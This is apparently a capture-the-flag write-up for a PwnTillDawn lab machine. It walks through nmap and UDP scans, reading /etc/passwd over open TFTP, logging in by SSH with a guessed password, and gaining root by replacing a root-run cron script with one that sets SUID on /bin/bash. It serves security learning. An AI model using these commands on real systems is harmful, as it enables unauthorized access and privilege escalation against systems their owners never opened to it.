![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/47596ddd-f8b4-468b-93b5-ed69d6105ae9)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Wed Jun  7 09:02:34 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80 -Pn 10.150.150.137
Nmap scan report for 10.150.150.137
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 14eedfe02f1cdcb63b3cec6a61ddc3e0 (RSA)
|   256 5deec83c1a9a3358de9956b436318c0d (ECDSA)
|_  256 4ce7e527651a90bbd462c936acdfaee4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  7 09:02:50 2023 -- 1 IP address (1 host up) scanned in 15.36 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d65a3b93-5d5d-4f79-b013-4518b626c0f0)

a web server was running on port 80, opening it on a browser we got to see a dog pic named `charlie`. checking the page source you will get `FLAG3`. tried fuzzing for hours and got no directory. let's scan for udp ports.

## Enumerating UDP 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.137]
└─$ sudo nmap -sV -sC -sU -p 69 10.150.150.137
[sudo] password for n16hth4wk: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 19:39 WAT
Nmap scan report for 10.150.150.137
Host is up (0.14s latency).

PORT   STATE         SERVICE VERSION
69/udp open|filtered tftp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.87 seconds
```
there's a UDP port open and it is running `tftp` service.
Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host. One of its primary uses is in the early stages of nodes booting from a local area network.
let's enumerate this service.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/10.150.150.137]
└─$ tftp 10.150.150.137
tftp> get /etc/passwd
tftp>
```
cool we are able to get th content of `/etc/passwd` file. let's check the file out.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/91e55cfa-3a8d-42ad-b33b-30004270fac3)

we can see a user `michael` remember we got a name on the web page `charlie`, let's try login ssh using `michael:charlie`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/bb927192-30b6-4372-bad1-932d39737707)

Bankai!!! we are in.


## Privilege Escalation 

```
michael@shelter:~$ ls -al
total 56
drwxr-xr-x 6 michael michael 4096 Jun  7 19:24 .
drwxr-xr-x 3 root    root    4096 Dec 21  2020 ..
-rw-r--r-- 1 root    root     297 Dec 21  2020 backup.py
-rw-r--r-- 1 root    root     230 Jun  7 19:24 backup.zip
-rw------- 1 michael michael    5 Apr 28  2021 .bash_history
-rw-r--r-- 1 michael michael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 michael michael 3771 Feb 25  2020 .bashrc
drwx------ 2 michael michael 4096 Dec 21  2020 .cache
drwxrwxr-x 2 michael michael 4096 Jun  7 19:24 important_files
drwxrwxr-x 3 michael michael 4096 Dec 21  2020 .local
-rw-r--r-- 1 michael michael  807 Feb 25  2020 .profile
-rw-rw-r-- 1 michael michael   66 Dec 22  2020 .selected_editor
drwx------ 2 michael michael 4096 Dec 21  2020 .ssh
-rw-rw-r-- 1 michael michael   41 Apr 21  2022 thisisFLAG1.txt
michael@shelter:~$ cat backup.py 
import os
import time
os.system("/usr/bin/zip -r /home/michael/backup.zip /home/michael/important_files/*")
os.system("/usr/bin/rm -r /home/michael/important_files/*")
os.system("touch /home/michael/important_files/spaceholder")
time.sleep(55)
os.system("/usr/bin/rm -r /home/michael/backup.zip")
michael@shelter:~$ 
```
found a `backup.py` file in michael's dir, checking the content, we can see it is a cronjob. let's abuse this 

```
michael@shelter:~$ mv backup.py /tmp/ 
michael@shelter:~$ nano backup.py
michael@shelter:~$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
michael@shelter:~$ cat backup.py
import os

os.system("chmod +s /bin/bash")
michael@shelter:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
michael@shelter:~$
```
moved the backup.py file to `/tmp` and create another `backup.py` file injecting it with malicious code to make suid bin. wait for a min and boom w got suid on `/bin/bash`.

```
michael@shelter:~$ bash -p
bash-5.0# id
uid=1000(michael) gid=1000(michael) euid=0(root) egid=0(root) groups=0(root),1000(michael)
bash-5.0# 
```
running command `bash -p` got us a root shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5e2bae52-9d2b-4a55-8033-2ab890fae772)

and we are through 😜 fun box innit 
